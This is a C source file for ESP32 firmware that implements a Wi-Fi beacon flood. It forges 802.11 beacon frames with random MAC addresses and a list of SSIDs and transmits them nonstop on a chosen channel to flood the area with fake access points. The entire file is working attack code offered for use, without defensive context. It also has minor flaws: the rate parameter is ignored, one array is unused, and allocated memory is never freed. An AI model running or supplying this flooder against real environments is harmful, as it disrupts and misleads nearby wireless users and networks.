#include "wifi_engine.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "BEACON";

static TaskHandle_t s_beacon_task = NULL;
static volatile bool s_running = false;

static const uint8_t BEACON_TEMPLATE[] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
};

static void random_mac(uint8_t *mac)
{
    esp_fill_random(mac, 6);
    mac[0] &= 0xFE;
    mac[0] |= 0x02;
}

static uint16_t build_beacon(uint8_t *buf, const char *ssid, const uint8_t *mac)
{
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    memcpy(buf, BEACON_TEMPLATE, sizeof(BEACON_TEMPLATE));
    memcpy(&buf[10], mac, 6);
    memcpy(&buf[16], mac, 6);

    size_t pos = sizeof(BEACON_TEMPLATE);
    buf[pos++] = 0x00;
    buf[pos++] = ssid_len;
    memcpy(buf + pos, ssid, ssid_len);
    pos += ssid_len;

    uint8_t rates[] = {0x02, 0x04, 0x0B, 0x16, 0x0C, 0x12, 0x18, 0x24};
    buf[pos++] = 0x01;
    buf[pos++] = sizeof(rates);
    memcpy(buf + pos, rates, sizeof(rates));
    pos += sizeof(rates);

    uint8_t ds_params[] = {0x03, 0x01, 0x06};
    buf[pos++] = 0x03;
    buf[pos++] = 0x01;
    buf[pos++] = 0x06;

    return pos;
}

static void beacon_flood_task(void *arg)
{
    char **ssid_list = ((char **)arg);
    uint16_t list_count = 0;
    while (ssid_list[list_count]) list_count++;
    if (list_count == 0) list_count = 1;

    uint32_t delay_ms = 1;
    uint16_t idx = 0;
    uint8_t mac[6];

    ESP_LOGI(TAG, "Beacon flood started: %d SSIDs", list_count);

    while (s_running) {
        random_mac(mac);
        const char *ssid = ssid_list[idx % list_count];
        uint8_t frame[512];
        uint16_t len = build_beacon(frame, ssid, mac);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
        idx++;
        if (delay_ms > 0) vTaskDelay(pdMS_TO_TICKS(delay_ms));
    }

    ESP_LOGI(TAG, "Beacon flood stopped");
    s_beacon_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t wifi_beacon_flood_start(const char **ssid_list, uint16_t count,
                                   uint8_t channel, uint32_t pps)
{
    if (s_beacon_task) wifi_beacon_flood_stop();
    if (!ssid_list || count == 0) return ESP_ERR_INVALID_ARG;

    s_running = true;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    char **list = calloc(count + 1, sizeof(char *));
    if (!list) return ESP_ERR_NO_MEM;
    for (int i = 0; i < count; i++) {
        list[i] = strdup(ssid_list[i]);
    }
    list[count] = NULL;

    xTaskCreatePinnedToCore(beacon_flood_task, "beacon", 4096, list, 5,
                            &s_beacon_task, 0);
    return ESP_OK;
}

esp_err_t wifi_beacon_flood_stop(void)
{
    s_running = false;
    if (s_beacon_task) {
        vTaskDelay(pdMS_TO_TICKS(100));
        if (s_beacon_task) {
            vTaskDelete(s_beacon_task);
            s_beacon_task = NULL;
        }
    }
    return ESP_OK;
}
